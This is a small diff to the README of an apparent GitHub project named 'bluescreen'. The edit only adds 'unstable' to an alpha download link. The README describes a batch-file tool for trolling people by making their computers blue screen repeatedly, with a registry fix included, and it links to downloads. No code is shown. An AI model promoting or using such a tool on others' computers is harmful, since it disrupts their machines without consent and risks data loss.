@@ -1,4 +1,4 @@
-[Alpha Version (sometimes untested)](https://codeload.github.com/jarryharry456/bluescreen/zip/refs/heads/main)
+[Alpha Version (sometimes untested and unstable)](https://codeload.github.com/jarryharry456/bluescreen/zip/refs/heads/main)
 [Release Versions](https://github.com/jarryharry456/bluescreen/releases)
 # Extract the zip file and open bluescreen.bat to get started.
 # A simple OPEN SOURCE! tool to troll people with causing their computer to contantly blue screen and includes a fix (fix.REG)
